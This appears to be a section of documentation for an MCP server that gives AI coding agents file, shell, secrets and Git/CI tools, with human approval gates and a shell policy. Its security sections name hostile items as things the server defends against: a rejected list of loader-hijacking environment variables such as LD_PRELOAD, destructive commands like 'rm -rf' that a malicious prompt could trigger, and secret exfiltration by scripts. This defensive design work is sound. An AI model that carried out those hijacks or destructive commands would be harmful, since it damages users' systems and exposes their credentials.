Every tool returns the standard envelope ([§8](#8-envelopes-hints--error-codes)):

```jsonc
{
  "ok": true,
  "status": "completed",
  "request_id": "8f3a…c2",
  "kind": "file_read",
  "data": { … },
  "truncated": false,        // optional
  "hint": "Next chunk: …",   // optional, self-explanatory next action
  "cached": true,            // optional, true when served from cache
  "elapsed_ms": 2.57
}
```

### 4.0 Tool modes

`tools/list` is filtered per workspace; whatever the mode hides the client never sees:

| Mode | Tools | Focus |
|---|---|---|
| `default` (default) | **31** | Coding-focused loop: read/write/edit (`project_write_file`, `project_edit_file`, `project_edit_batch`), `project_search`, checkpoints, code intel (`project_outline_symbol`, `project_file_symbols`, …), dependency graph + change impact, diagnostics, read planning, audit/trace, secrets metadata. **No** shell execution (`project_shell_run`, `project_shell_status`, `project_shell_cancel`, `project_shell_cancel_session`), **no** `project_execute_js`, **no** destructive `project_delete_path`, **no** CI/CD shipping (`project_pr_*`, `project_ci_*`). |
| `expert` | **46** (47 with `VENIRA_ALLOW_JS_EXEC=1`) | Full surface: everything in `default` plus shell, JS eval, PR/CI tools and `project_delete_path`. |

Set with `VENIRA_TOOL_MODE=default|expert` or `"toolMode"` in `venira.config.json` (env wins over config). `VENIRA_DISABLE_TOOLS` and `VENIRA_PROFILE=core` still apply on top of the mode — all three exclusions are unioned, so anything they disable stays disabled in both modes.

### 4.1 Read family (read-only, batch-safe, cached)

| Tool | Purpose | Notes |
|---|---|---|
| `project_list_files` | List files/dirs, depth 1–3, limit ≤ 200 | TTL cache 1.5 s, invalidated on any mutation |
| `project_read_file` | Read a text file, by line range (1-based) | mtime+size-validated cache; `next_start_line` when truncated; optional `line_numbers` prefix |
| `project_read_ranges` | Read **multiple disjoint line ranges of one file** in a single call (max 16) | Reuses the read cache per range |
| `project_get_file_info` | File/dir metadata: kind, size, mtime | Very fast; cached |
| `project_search` | Search by file name, dir name, literal content, regex, or symbol definition | TTL cache 3 s; respects `glob`, `exclude_glob`, `context_lines`, `count_only` · `hybrid: 1` tags each hit with `source` (`symbol_index` definition · `symbol_reference` whole-word · `content`) and `confidence` (`exact_match` · `text_match`); a scoped identifier-like query with 0 hits widens once to the workspace (`scope_widened: true`); 0-hit results are cached; mutations invalidate |
| `project_recent_files` | Files modified recently (SQLite index first, bounded scan fallback) | `source: "index" | "fallback_scan"`; includes `session_edits` — files you wrote in this session |
| `project_read_batch` | Run up to **8 read-only ops in one call** (`list_files`, `read_file`, `get_file_info`, `search`) | Sequential + cached; response budget enforced per item |
| `project_health` | Server diagnostics: capability, queue, cache/trace/shell config, active shells, p50/p95 per op, audit DB stats | `include_audit=0` skips the DB query (~2 ms) |
| `project_read_audit` | Read recent rows from the SQLite audit log (filter by session/operation/outcome) | Bounded; `audit_unavailable` fallback if the DB is locked |
| `project_trace_status` | Show the most recent traced tool calls + trace config | In-memory ring buffer, no file read |

### 4.2 JS Execution family (optional code execution; not sandboxed)

| Tool | Purpose | Notes |
|---|---|---|
| `project_execute_js` | Run synchronous JavaScript code with Node's permission model | `code`: the JS script string (required) · `timeout_ms`: 1–600_000 ms (default 30_000) · `argv`: additional arguments passed to `node` · `approval_id`: grant from a previous call · stdout/stderr tails capped at 1 MiB. With `VENIRA_JS_EXEC_APPROVAL=1` (default) the first call returns `approval_required`; the user grants that id with `npx venira-mcp --approve <id>` and the agent retries — grants cover the exact code + `argv` and are single-use. When enabled, filesystem read/write permissions are restricted to the workspace, child-process and worker permissions are not granted, and `HOME`/`USERPROFILE` are blanked; `NODE_PATH` points to the workspace's `node_modules`. This is containment, not a sandbox: review code before enabling and use a container/VM for hostile code. Use for lightweight JS computation or workspace file I/O, not shell pipelines or long-running processes (`project_shell_run` is the right tool). The tool has `destructiveHint: true` because code execution can have unexpected side effects. |

### 4.3 Code intelligence family (P2/P3, regex/LCS-based, no external indexer)

| Tool | Purpose | Notes |
|---|---|---|
| `project_outline_symbol` | Parse a source file and return its symbol outline (functions, classes, types, interfaces) with line numbers | Fast single-file regex scan; `max_symbols` cap |
| `project_file_symbols` | Extract **all** symbols (fn/def/class/struct/interface) from one source file | Optional `language` hint; `include_functions`/`include_classes` filters |
| `project_diff_files` | Unified (git-style) diff between two workspace files | LCS-based; `lines_added`/`lines_removed`; `context_lines` + `max_lines` caps; `truncated` flag |
| `project_symbol_references` | Find every occurrence of a named symbol | `scope: "file"` (fast, single file) or `scope: "workspace"` (bounded content search); `limit`/`max_references` caps |
| `project_selective_search` | Smart multi-query search: combine patterns with AND/NOT + fuzzy scoring | Bounded to a file set (`files_hint` or shallow listing); scored hits sorted by relevance; `limit` cap |
| `project_dependency_graph` | Deterministic **dependency graph** for TypeScript/JavaScript, Python and Rust: module declarations (`mod`, `pub mod`), `use crate::`/`super::`, `extern crate`, relative imports, `require()`, dynamic `import()`, `extends`/`implements` and cross-file symbol references | `kind: files \| symbols \| both` (default `files`) · `format: json \| dot \| mermaid` (`data.graph` for the last two) · `relative_path` scopes the walk · `depth` 1–10 directory cap (default 3) · `languages`, `include_external`, `include_tests`, `max_nodes` (500), `max_edges` (2000). Parser-lite, no new dependencies: bounded walk (≤5,000 files / 64 MB), symlinks and protected paths (`.env*`, keys, `secrets.*` data files) skipped, 5 s index cache invalidated by writes/snapshot restore. Node ids are workspace-relative. |
| `project_change_impact` | Answer "if I edit this, what depends on it?" with a bounded reverse (or forward) closure | Seeds: `files[]` and/or `symbols[]` (a name, or `{name, file}` when ambiguous) · `direction: dependents \| dependencies \| both` · `depth` 1–10 BFS hop cap (default 5) · `include_tests` (default 1) · `max_nodes`, `format: json \| mermaid`. Each affected file carries `distance`, `path`, `reason` and `confidence` (`exact`/`likely`/`possible`); `summary` adds `affected_symbols` and a separate `tests_affected`. Ambiguous bare names seed every declaring file, are reported in `unresolved[]`, and downgrade the closure to `possible`. |

Dependency graph and impact analysis are **disabled in `VENIRA_PROFILE=core`** (they walk the whole
workspace); `project_ci_wait` stays available because it is a provider call.

### 4.4 Write family (mutating)

| Tool | Purpose | Notes |
|---|---|---|
| `project_write_file` | Create / overwrite / append a file | `mode: "create"` errors if file exists; `expected_sha256` guards against blind overwrites; `reason` recorded in the audit log |
| `project_edit_file` | Replace exact text: one `old_text`/`new_text` pair **or** up to 64 `edits[]` | `replace_all` supported; `expected_sha256` available; `reason` (e.g. "fix null pointer at line 45") recorded in the audit log; **P2 fuzzy edit** (`VENIRA_EDIT_FUZZY=1`): `old_text_fuzzy`, `fuzzy_distance`, `ignore_indentation`, `case_insensitive` args |
| `project_edit_batch` | Apply multiple `project_edit_file` operations atomically | Stops at the first failure; restores the pre-batch snapshot when possible; response reports `executed`/`skipped` indexes and rollback status |
| `project_create_directory` | Create a directory tree | `create_parents` defaults to `true`; optional `reason` |
| `project_create` | Create a **file or directory in one call** | `kind: "file"` requires `content`; `kind: "directory"` ignores `content`; optional `reason` |
| `project_delete_path` | Delete a file or directory tree | `recursive: 1` for directories. **Not undoable.** Optional `reason` |

### 4.5 Checkpoints (snapshot + rollback, no git)

| Tool | Purpose | Notes |
|---|---|---|
| `project_snapshot` | Save the current state before a large edit chain; roll back in one call | `action: "create"` (paths default `["."]`) → `id`; `action: "list"`; `action: "restore"` (`id`, optional `dry_run=1`, `verify=1`, `delete_extra=0`, `paths[]` filter); `action: "delete"` (`id`) |

Content-addressed and deduplicated: blobs live under `snapshots/blobs/<ab>/<sha256>`, manifests
(`.json.gz`) under `snapshots/index/<id>.json.gz` in `VENIRA_DATA_DIR` (default: the per-user OS data dir).
A second checkpoint after a small edit only stores the changed bytes. Restore is atomic per file
(temp + rename), concurrency 4, sha256-verified by default, and only rewrites paths that were
captured (it never touches anything else unless `delete_extra=1`, which is capped at 500 files).
`.git`, `node_modules`, `dist`, `build`, `.next`, virtualenvs, `__pycache__`, the checkpoint store,
the audit DB, and the secret store (`secrets.json` / `secrets.key`) are skipped by default; symlinks
are never followed (and a restore refuses a
captured path whose parent directory became a symlink after the checkpoint); a checkpoint only
restores into the workspace it was created from; old checkpoints are pruned
(`VENIRA_SNAPSHOT_KEEP`, default 20).

```jsonc
// create  → { id: "snap-20261029-090309-cce15f", file_count: 42, total_bytes: 3312, new_blob_bytes: 3312 }
project_snapshot({ action: "create", paths: ["src"], label: "before auth refactor", reason: "try a risky refactor" })
// ...edits...
project_snapshot({ action: "restore", id: "snap-…", dry_run: 1 })   // inspect first
project_snapshot({ action: "restore", id: "snap-…" })                  // roll back
```

### 4.6 Git provider: pull requests (GitHub, GitLab, Bitbucket)

| Tool | Purpose | Notes |
|---|---|---|
| `project_pr_create` | Open a pull/merge request for the current (or explicit) branch | `title` required · `head` defaults to the current branch · `base` defaults to the repo default branch (cached 5 min) · `body`, `draft`, `repo`, `provider`, `reason`. Returns `number`, `url`, `state`, `head`, `base`, `provider`. |
| `project_pr_comment` | Post a comment on a PR/MR: general thread comment **or inline review note** | `pr` accepts a number **or** a full PR/MR URL · `body` (markdown) · for an inline note add `path` + `line` (plus optional `start_line`, `side: RIGHT\|LEFT`, `commit_id`) · `commit_id` defaults to the **PR head sha** · `repo`, `provider`, `reason`. Returns `inline`, `path`, `line`, `commit_id`, `comment_id`, `url`. |
| `project_pr_merge` | Merge a PR/MR and optionally delete the head branch | `method: merge \| squash \| rebase` · `commit_title`, `commit_message`, `delete_branch` · `repo`, `provider`, `reason`. A closed/already-merged PR returns `already_merged`; a conflicting PR returns `conflict`. Bitbucket uses `merge_commit` / `squash` / `fast_forward` strategies. |
| `project_pr_list` | List pull/merge requests for a repo | `state: open \| closed \| all` (default `open`) · `head`, `base` filters · `limit` ≤ 100 · `repo`, `provider`. Returns `repo`, `provider`, `state`, `total`, `prs[]` with `number`, `title`, `state`, `draft`, `head`, `base`, `author`, `url`. |
| `project_pr_close` | Close/decline an open PR/MR | `pr` (number or URL) · `repo`, `provider`, `reason`. Idempotent (closing a closed PR is a no-op). Bitbucket calls this "decline". |
| `project_pr_reopen` | Reopen a closed PR/MR | `pr` (number or URL) · `repo`, `provider`, `reason`. Idempotent. GitHub & GitLab supported; Bitbucket returns `unsupported` (open a new PR instead). |

The provider, API base, token and limits are resolved per call from **call args → `venira.config.json` → environment → inferred remote → default** (see §3.5). The token comes from `project_secret` (`GITHUB_TOKEN`/`GITLAB_TOKEN`/`BITBUCKET_TOKEN` by provider), then provider-specific env vars (`VENIRA_GITHUB_TOKEN`/`GITHUB_TOKEN`/`GH_TOKEN`, `VENIRA_GITLAB_TOKEN`/`GITLAB_TOKEN`/`GL_TOKEN`, `VENIRA_BITBUCKET_TOKEN`/`BITBUCKET_TOKEN`/`BB_TOKEN`), then the generic `VENIRA_GIT_TOKEN`. Owner/name are validated against `[A-Za-z0-9._-]`. Requests go over `node:https` with configurable timeout, response-size cap, redirect limit and manual redirect handling: the auth header is only attached while the request still targets the API host. An optional CONNECT proxy (`VENIRA_GIT_PROXY` > `HTTPS_PROXY` > config) with `NO_PROXY` matching is supported.

```jsonc
project_pr_create({ title: "Add provider tools", head: "feature/x", reason: "open PR for review" })
// → { repo: "acme/demo", provider: "github", number: 7, url: "https://github.com/acme/demo/pull/7", state: "open", created: true }
project_pr_merge({ pr: 7, method: "squash", delete_branch: 1 })
```### 4.7 CI provider: GitHub Actions, GitLab Pipelines, Bitbucket Pipelines

| Tool | Purpose | Notes |
|---|---|---|
| `project_ci_status` | Read the latest runs for a branch/workflow, one run **with its jobs**, or branch-protection **check-runs** (GitHub) | `branch`, `workflow` (file name or id), `limit` ≤ 50 → workflow runs / pipelines; `run_id` → run + `jobs[]`; `ref` (sha/branch) or `pr` (resolved to the head sha) → `check_runs[]` (GitHub) or newest pipeline (GitLab/Bitbucket). Returns `overall` (`success \| failure \| in_progress \| no_runs \| no_checks`), `source` (`actions` \| `pipelines` \| `check-runs`), `provider`. |
| `project_ci_trigger` | Dispatch a workflow / pipeline | `workflow` (GitHub: file name or id; GitLab/Bitbucket: optional label/pattern) · `ref` defaults to current branch → default branch · `inputs`/`variables` (string/number/boolean), `reason`. |
| `project_ci_logs` | Read the tail of a run's or job's logs | `run_id` (GitHub: ZIP; GitLab/Bitbucket: up to 3 failing jobs/steps) or `job_id` (GitHub/GitLab: job id; Bitbucket: step UUID or `pipeline:step`) · `tail_lines` (default 500) · `max_bytes` (default 512 KB, cap 4 MB). Archive cap 32 MB, per-entry cap 4 MB, unsupported/encrypted entries reported in `entries[].skipped`. |
| `project_ci_wait` | **Long-poll** one run/ref/PR/branch until it finishes or changes | Exactly one selector: `run_id`, `ref`, `pr` or `branch` (optionally narrow a branch with `workflow`) · `until: terminal \| any_change` (default `terminal`) · `timeout_ms` 1–110 s (default 45 s) · `interval_ms` 2–15 s (default 5 s) · `include_failure_tail` + `tail_lines` return the same bounded log tail as `project_ci_logs` on failure. Returns `overall`, `previous`, `changed`, `terminal`, `waited_ms`, `polls`, `run`, `selector`, `ci_status`, `failure_tail?`. Unqueued (other tools keep working) and refused before a socket opens when `VENIRA_NETWORK=0`. |

`project_ci_wait` is a bounded **long-poll**, not a background watcher: MCP over stdio cannot push a
notification that wakes the model. A `terminal: false` result means "nothing changed before the
timeout" — call it again with the same selector (keep `timeout_ms` below your client's request
timeout, which is usually ~60 s). On failure, `failure_tail.text` is ready to feed to
`project_explain_error` without a second log fetch.

Logs are never extracted to disk (no zip-slip) and never fully returned: the response is the tail plus `entries[]`, `lines`, `truncated`, `dropped_lines` and `dropped_bytes`. The download redirects to a pre-signed storage URL, and the token is dropped on that hop by design.

```jsonc
project_ci_status({ branch: "feature/x", limit: 3 })
// → { overall: "failure", source: "pipelines", provider: "gitlab", runs: [{ id: 77, conclusion: "failure", url: "…/pipelines/77" }, …] }
project_ci_logs({ run_id: 77, tail_lines: 50 })   // or { job_id: 2 } / { run_id: "uuid", job_id: "uuid" } for Bitbucket
```### 4.8 Secrets (encrypted at rest, never in the transcript)

| Tool | Purpose | Notes |
|---|---|---|
| `project_secret` | Store / inspect / remove credentials by env-var name, with rotation metadata | `action: "set"` (`value` or **`value_env`** to read it from the host env; optional `expires_in_days` or `expires_at`) · `"get"` (metadata only: `length`, `sha256_12`, `updated_at`, `expires_at`, `expired`, `days_left`, `last_used_at`, `use_count`, `rotated_at`) · `"list"` (same metadata per name) · `"delete"`. `reveal: 1` returns plaintext **only** when the host sets `VENIRA_SECRET_ALLOW_REVEAL=1`. |
| `project_github_connect` | Connect or replace the local GitHub account without sending a token through chat | `action: "start"` returns GitHub verification URL/code · `action: "poll"` completes authorization using the opaque `pending_id`; access/refresh tokens are stored in the encrypted local vault and never returned. Uses OAuth `repo offline_access` scopes. |

Rotation is tracked automatically: every successful injection (or provider token read) bumps
`last_used_at` / `use_count`; a re-`set` is a rotation that overwrites the value, resets the
counter and keeps the previous expiry unless a new one is given. Expired secrets are **refused**
before a child process starts (`secret_expired`, with a rotate hint), so a dead token can never
silently fail as a `401`.

Values are encrypted with **AES-256-GCM** in `<VENIRA_DATA_DIR>/secrets.json`, with the key in
`secrets.key` (mode `0600`, written via temp file + rename). The preferred way to *use* a secret
is injection, not disclosure:

```jsonc
project_secret({ action: "set", name: "NPM_TOKEN", value_env: "NPM_TOKEN" })  // value never in the call
project_shell_run({ command: "npm publish --dry-run", shell: "bash", secret_env: ["NPM_TOKEN"] })
// → the child gets NPM_TOKEN in its environment; the tool returns secret_env: ["NPM_TOKEN"],
//   while direct secret occurrences are scrubbed from output tails/audit text when possible.
```

- Names must match `[A-Za-z_][A-Za-z0-9_]{0,63}`; loader-hijacking names (`NODE_OPTIONS`,
  `LD_PRELOAD`, `DYLD_*`, `PYTHONSTARTUP`, `PYTHONPATH`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`,
  `GIT_SSH_COMMAND`) are rejected.
- `secret_env` takes ≤ 16 names, is validated **before** the policy gate and always requires
  explicit human approval, even for an otherwise allowed command. The values are decrypted only
  **after** approval, so an unreviewed command never receives them. Review any script contents
  before approving secret injection.
- Values ≥ 8 chars are redacted from `stdout_tail` / `stderr_tail` and from the audit
  `command`/`reason` columns on a best-effort basis. This is not a defense against scripts that
  encode, transform, or exfiltrate a value; approval requires reviewing the command and script.
  The secret store itself is excluded from checkpoints and `delete_extra`.

### 4.9 Diagnostics & read planning (deterministic, no model call)

| Tool | Purpose | Notes |
|---|---|---|
| `project_explain_error` | Turn a failure into a cause + next tool calls | Feed `error_text` or `log_tail` (e.g. the tail from `project_ci_logs` / `project_shell_status`). Matches a rule table (POSIX errno, TypeScript/Python/pytest, git, npm, GitHub, venira codes) and returns `matched`, `summary`, `error_line`, `language`, `diagnoses[]` (`rule_id`, `likely_cause`, `suggested_fix[]`, `retry_hint`, `next_actions[]`) and a deduped `next_actions[]`. Unknown signatures return `matched: false` with a triage note — never an error. |
| `project_plan_read_batch` | Plan which files to read for a task, in one call | `task_description` (one line) → keywords (quoted terms, identifiers, words) → up to 3 bounded **content + file-name** searches → candidates ranked by hits, path/name match and prose weight (+ `files_hint`, + recent edits when the search is thin) → `steps[]` with a **ready-to-send** `project_read_batch` call, calibrated `estimated_ms`. Build/vendor dirs, lockfiles and DB/log/binary artifacts are excluded; README/docs/`*.md` are demoted unless the task mentions docs. `max_files` ≤ 8, `include_search: 0` to plan from hints only. |

Both are pure local logic: no network, no model, no file contents in the response (the plan points
at files; you decide which step to run). They exist to cut the "guess → read → repeat" loop that
costs the most round-trips in an unfamiliar codebase.

```jsonc
project_explain_error({ log_tail: "Error: connect ECONNREFUSED 127.0.0.1:5432" })
// → { matched: true, diagnoses: [{ rule_id: "net.econnrefused", likely_cause: "Nothing is listening …",
//      suggested_fix: ["Start the dependency …", "Confirm the port …"] }] }

project_plan_read_batch({ task_description: "add retry handling to the GitHub client" })
// → { keywords: ["retry", "github", …], candidates: [{ relative_path: "lib/git-provider.ts", hits: 3 }],
//      steps: [{ tool: "project_read_batch", arguments: { requests: [ … ] }, why: "read the ranked candidates" }] }
```

### 4.10 Shell family (async, non-blocking, policy-gated)

| Tool | Purpose | Notes |
|---|---|---|
| `project_shell_run` | Start a shell command; returns `run_id`/`shell_id` immediately by default | `shell`: `powershell` / `cmd` / `bash` · `relative_cwd` · `background: 0` / `false` blocks until the command exits and returns bounded full `stdout`/`stderr` in the same call; `1` (default) stays non-blocking and returns tails for polling · `timeout_ms` (kills the **process tree** under hard timeout policy) · `secret_env: ["NAME"]` (inject stored secrets as env vars only after explicit human approval; raw values are not added to command/audit text, output scrubbing is best-effort) · Node script executions also require approval because the policy cannot inspect their effects · `approval_id` for the default human approval flow; `approval_token` + `approval_scope` are legacy compatibility. All captured streams remain capped at 1 MiB each. |
| `project_shell_status` | Poll a running command | `wait_seconds` 0–30 is an *observation window*, not a timeout. Deliberately **not queued** behind other calls, not audit-logged (prevents orphan "running" rows). Reports `timed_out`, `dropped_bytes` and the policy decision. |
| `project_shell_cancel` | Kill a running command by `run_id` | Kills the whole tree (`taskkill /T` on Windows, process group on POSIX). Also used at MCP shutdown to avoid orphan processes. |
| `project_shell_cancel_session` | Cancel **all** shell runs tracked in this session | P1; kills every process tree in the session at once. |

`project_shell_run` passes a policy gate before anything is spawned:

```jsonc
// 1) The command needs approval: nothing ran, a pending approval id comes back.
{ "ok": false, "error": { "code": "approval_required", "retryable": false },
  "data": { "rule": "ask.writes_outside_workspace", "reason": "This command writes or deletes outside the workspace.",
            "approval_id": "apr_1793176040000_…", "expires_at": 1793176040000,
            "retry_with": { "tool": "project_shell_run", "arguments": { … } } },
  "hint": "Ask the user to run npx --yes venira-mcp@latest --approve <approval_id> in an interactive terminal, then retry with approval_id=…" }

// 2) The user approved in a separate terminal: retry once with the approval id.
project_shell_run({ command: "…", approval_id: "apr_…" })
```

The default flow is human-first: the server creates an approval record, and a human
approves it with `npx --yes venira-mcp@latest --approve <id>` (add `--session` only when the rule
allows a session grant). The resulting HMAC grant is single-use, bound to the session,
exact command hash, shell, cwd, secret names and policy rule, and expires after
`VENIRA_SHELL_APPROVAL_TTL_MS`. `VENIRA_SHELL_AUTO_APPROVE_TOKEN=1` enables the legacy
token flow for controlled integrations. Catastrophic commands are refused with
`command_denied` in every mode — no approval can unlock them.

### 4.11 How the model is told to pick the right tool

At connect time the server advertises an `instructions` block (MCP SDK ≥ 1.32) containing a
**decision tree** the model can read. A condensed version:

```
1. Two+ reads or mixed read-only steps → project_read_batch (max 8, sequential + cached)
2. One file → project_read_file; large file → start_line/end_line or project_read_ranges;
   follow next_start_line when truncated
3. Find code → project_search (kind=literal_content or definition), then project_read_ranges around hits
4. Directory tree → project_list_files (depth 1..3, limit ≤200). "What changed lately?" → project_recent_files
5. Understand a file's structure → project_outline_symbol / project_file_symbols;
   find every usage → project_symbol_references; compare two files → project_diff_files;
   rank many files by several keywords → project_selective_search;
   file/symbol dependency graph → project_dependency_graph;
   "what breaks if I edit this?" → project_change_impact (direction=dependents)
6. Write whole file → project_write_file; small precise change → project_edit_file
   (fuzzy match via VENIRA_EDIT_FUZZY=1); delete → project_delete_path (destructive, not undoable)
   — always pass `reason` ("why") so the audit trail explains intent later
7. Before a large/multi-file change chain → project_snapshot action=create; if it goes wrong
   → action=restore id=… (dry_run first when unsure)
8. Build/test/long command → project_shell_run (returns run_id immediately),
   then poll project_shell_status (wait_seconds 5..30); project_shell_cancel to stop.
   Need the final output in one call? Use project_shell_run background=0: it blocks
   until the command exits, so do not start other work while waiting (keep the run
   under the client request timeout, or poll the async run instead)
9. A token/credential → project_secret action=set (prefer value_env; expires_in_days for
   rotation) or action=get/list for metadata; inject with project_shell_run secret_env=["NAME"]
   — never paste the value. Expired secrets are refused (secret_expired)
10. Open a PR → project_pr_create; discuss it → project_pr_comment (path+line for an inline note);
    land it → project_pr_merge
11. Pipeline state → project_ci_status (pr/ref for check-runs); re-run → project_ci_trigger;
    failure detail → project_ci_logs (pass job_id to isolate the failing job);
    wait for a result → project_ci_wait (bounded long-poll; on failure it returns the log tail)
12. Something failed and the cause is unclear → project_explain_error (error_text / log_tail),
    then follow its first diagnosis + next_actions
13. Starting an unfamiliar task → project_plan_read_batch(task_description, files_hint?),
    then run steps[0] (a ready read_batch) instead of guessing files
14. Debug latency/errors → project_health; inspect the audit trail → project_read_audit
```

`project_dependency_graph` and `project_change_impact` are not registered under
`VENIRA_PROFILE=core`. `project_ci_wait` stays available there because it is a provider call.

Every tool also carries machine-readable metadata in its description (`Use when:` / `Avoid when:` /
`Speed:` / `Output:` / `Batch-safe:`) and a `_meta.venira` object with the same fields, so both
prompt-driven and tool-discovery-driven clients get the same signal.

---

## 5. Architecture

```
venira-mcp/
├── server.ts                 # MCP entry point: McpServer + StdioTransport, warm-up, shutdown
├── tools/
│   └── project.ts            # tool registrations per tool mode (default 31 / expert full), serial queue, caches, shell tracking,
│                             #   audit-DB inspection, project_health, code-intelligence,
│                             #   diagnostics and read-planning handlers
├── lib/
│   ├── corehost.ts           # In-process backend: file I/O, search, async shell,
│   │                         #   scope capability, SQLite WAL audit (better-sqlite3),
│   │                         #   fuzzy edit, recent-files index, secret_env injection
│   ├── git-provider.ts       # Provider router for GitHub, GitLab and Bitbucket:
│   │                         #   PR/MR and CI operations, repo detection, https-only client
│   │                         #   with redirect token hygiene
│   ├── secrets.ts            # Encrypted secret store (AES-256-GCM, atomic writes),
│   │                         #   rotation metadata (expiry / last use / use count),
│   │                         #   expired-secret guard, redaction of values in output/audit
│   ├── diagnostics.ts        # Deterministic error rules (errno, TS/Python, git, npm,
│   │                         #   GitHub, venira codes) -> cause + ready next_actions
│   ├── read-plan.ts          # Deterministic read planner: keywords -> ranked candidates
│   │                         #   -> a ready project_read_batch call + estimate
│   ├── symbol-diff.ts        # P2/P3 code intelligence: symbol extraction, outline,
│   │                         #   unified diff (LCS), selective multi-query search
│   ├── snapshots.ts          # Checkpoints: content-addressed blobs + gzip manifests,
│   │                         #   create/list/restore/delete, sha256 verify, safe path scoping
│   ├── tracer.ts             # P1 request tracing (VENIRA_TRACE / VENIRA_TRACE_FILE)
│   ├── workspace.ts          # Workspace path resolution + escape validation + cache toggles
│   ├── output.ts             # Envelope builder, output modes, hint inference, error parser
│   ├── metrics.ts            # Ring-buffer p50/p95/max per operation (256 samples each)
│   ├── types.ts              # Shared host snapshot types
│   └── version.ts            # Exported VERSION constant
├── scripts/
│   ├── smoke.ts              # In-process backend sanity check
│   ├── bench.ts              # In-process backend benchmark
│   ├── bench-mcp.ts          # End-to-end MCP benchmark
│   ├── verify.ts             # end-to-end checks (cache, batch, shell, audit, modes,
│   │                         #   snapshots, secrets/rotation, GitHub PR/CI/check-runs/inline
│   │                         #   comments against a local mock, diagnostics + read planning)
│   ├── github-mock.ts        # In-process GitHub API + pre-signed-blob mock (no network, no token)
│   └── doctor.ts             # 12 preflight checks (workspace, data dir, tools, health, shell, P1 config)
├── opencode.example.json     # Ready-to-edit OpenCode MCP config
├── package.json / tsconfig.json
└── dist/                     # Build output (committed to the npm package, gitignored in repo)
```

**Key design decisions**

- **In-process backend.** The `CoreHost` class in `lib/corehost.ts` implements every
  `project_tool.*` operation in pure Node — no JSON-Lines IPC, no child process. The
  `tools/project.ts` layer still funnels calls through a **serial queue** because
  SQLite WAL audit writes are cheap but not free; keeping one writer at a time is
  simpler and deterministic than racing on `better-sqlite3` transactions.
- **Long-lived capability.** The workspace scope (capability token, TTL 2 h) is opened
  **once** at startup (in parallel with the MCP handshake) and reused for every request.
  A capability expiry triggers exactly one re-open-and-retry.
- **Cache strategy.** Reads and file-info are cached and validated by `mtime + size`
  (immune to external edits and deletions). List / search / recent use short TTLs
  (1.5 s / 3 s / 2 s) and are wiped on any mutation. Search results with 0 hits are
  *not* cached (prevents stale "no match"). Read + info caches are bounded by
  `VENIRA_READ_CACHE_BYTES` (default 64 MiB) with LRU eviction.
- **Audit, not just logging.** `better-sqlite3` opens `venira.db` in WAL mode.
  Every `execute` op gets a `running` row on start and a `succeeded`/`failed`
  row on completion. `shell_status` is the only op intentionally *not* audited —
  a long poll must never leave an orphan `running` row. `project_health`
  (with `include_audit`) reports orphan rows as a post-mortem signal.

---

## 6. Security model

This project is intentionally **conservative by default**:

| Control | Default | How it works |
|---|---|---|
| **Workspace lock** | ON | `lib/workspace.ts` resolves every path against `VENIRA_WORKSPACE` (or `process.cwd()`). A path that escapes (`../..`, absolute outside root) throws `path_escape`. |
| **Unrestricted mode** | OFF | `VENIRA_UNRESTRICTED=1` disables the lock (use only when you fully understand the consequences — the agent can read/write anywhere on the machine). |
| **Shell cwd** | workspace | `project_shell_run` with no `relative_cwd` runs in the workspace root; the command itself is still whatever the agent passes. |
| **Shell policy** | `balanced` | Hard-coded catastrophes and protected credential paths (including redirects and matching globs) are denied; risky operations (writes outside workspace, network fetches, package mutation, Git history rewrites…) require approval. `permissive` skips ordinary ask rules but Git history rewrites still require explicit approval or `ALLOW_GIT_PUSH`. |
| **Audit** | ON | Auditable operations (including failures, shell runs and cancellations) are written to `project_tool_audit` in a SQLite WAL database when the database is available; audit failures are surfaced. Long-poll observation calls such as `project_shell_status` are intentionally not audit rows. |
| **`sensitive_result`** | — | The envelope carries `retryable: false` and a "do not retry" hint when content is withheld by policy. |
| **`expected_sha256`** | opt-in | `project_write_file` / `project_edit_file` / `project_create` accept a content hash; a mismatch aborts with `conflict` — protects against blind overwrites when the agent re-applies an old edit. |
| **Destructive ops** | labelled | Every mutating tool advertises `destructiveHint: true` in its MCP annotations; `project_delete_path` additionally documents that it is not undoable. |
| **Network (provider APIs)** | opt-in per call, kill switch | Built-in `project_pr_*` / `project_ci_*` calls are governed by `VENIRA_NETWORK=0` and require an HTTPS API base (HTTP is allowed for localhost/tests). Shell commands are separate and may access the network when shell policy allows them. |
| **Token transport** | header only | The configured provider token travels as an `Authorization` header, never in a command string or a URL. On a cross-origin pre-signed log-download redirect it is **dropped** because the origin changed. |
| **Secrets at rest** | AES-256-GCM | Values are encrypted in `secrets.json`; new Windows installs use the optional Windows Credential Manager backend (`keytar`) when available, while existing/unsupported installs use `secrets.key` (`0600`, atomic). `get`/`list` return metadata only unless `VENIRA_SECRET_ALLOW_REVEAL=1` *and* `reveal=1` are both set. |
| **Git provider DLP** | fail closed | PR/CI request arguments and final HTTP payloads are scanned locally with Secretlint's recommended rules (including GitHub/GitLab tokens and private keys); known vault and sensitive environment values are also checked. Detected requests are cancelled before sending, provider output with a detected credential is withheld from the AI, and scanner failure blocks the request. A response-side block may follow a completed mutation; do not retry it blindly. |
| **Secret leakage** | redacted | Stored values (≥ 8 chars) are scrubbed from shell tails and from the audit `command`/`reason` columns; external ops log a summary (`PUT /pulls/7/merge repo=… method=squash`) instead of the body. Checkpoints and `delete_extra` skip the secret store. |

**Threats this does NOT protect against:** a malicious prompt can still instruct the agent to
run destructive shell commands (`rm -rf`, `format`…). The audit log and `project_health` make that
visible *after* the fact; the workspace lock only bounds filesystem access, not shell side-effects.
If you need hard boundaries, run the MCP server in a container / VM, or drop `VENIRA_DEFAULT_SHELL`
to a restricted shell profile.

---

### 6.1 Shell policy (hardening for `project_shell_run`)

`venira-mcp` ships with a built‑in policy that guards against the most common destructive patterns while
still enabling useful workflows:

| Level | What it does | When to use |
|---|---|---|
| `balanced` (default) | Never runs a command whose rule is `deny`. Commands matching **ask rules** (writes outside workspace, network access, package mutations, container controls, all `git push` operations, etc.) return `approval_required` with a human-approved grant. All other commands run. | General interaction with the workspace. |
| `strict` | Only commands on the **allow‑list** run without approval. Everything else requires approval. Allows a safe environment when you know exactly what tools an agent can invoke. | High‑value or public workspaces where you want to whitelist allowed tools. |
| `permissive` | Skips ordinary ask rules. Hard-deny and protected-file rules still block commands; Git history rewrites still ask unless the named `ALLOW_GIT_PUSH` override is explicitly enabled and passed. *Caution:* this removes other approval prompts. | Internal debugging or trusted agents with strict code review. |

#### 6.1.1 Built-in rule categories (balanced mode)

